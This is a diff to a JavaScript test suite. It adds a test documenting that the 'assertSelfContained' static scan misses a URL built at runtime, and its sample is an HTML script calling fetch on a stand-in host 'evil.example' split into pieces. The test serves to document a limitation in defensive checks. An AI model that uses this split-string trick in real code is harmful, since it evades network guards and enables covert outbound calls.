@@ -40,6 +40,17 @@ describe('assertSelfContained', () => {
       /not self-contained/
     )
   })
+
+  // Documents the KNOWN limitation (not a bug): a static text scan cannot catch a
+  // URL constructed at runtime, so this evades `assertSelfContained`. The real
+  // no-network control is the bundled widget's runtime CSP + opaque-origin sandbox,
+  // NOT this scan. If this ever starts throwing, the scan has been upgraded and the
+  // comment in bundle-guards.js should be revisited.
+  test('does NOT catch a runtime-constructed URL (defense-in-depth only)', () => {
+    const evasion =
+      '<!doctype html><script>fetch("https:" + "//evil.example/x")</script>'
+    expect(() => assertSelfContained(evasion)).not.toThrow()
+  })
 })
 
 describe('htmlByteLength', () => {
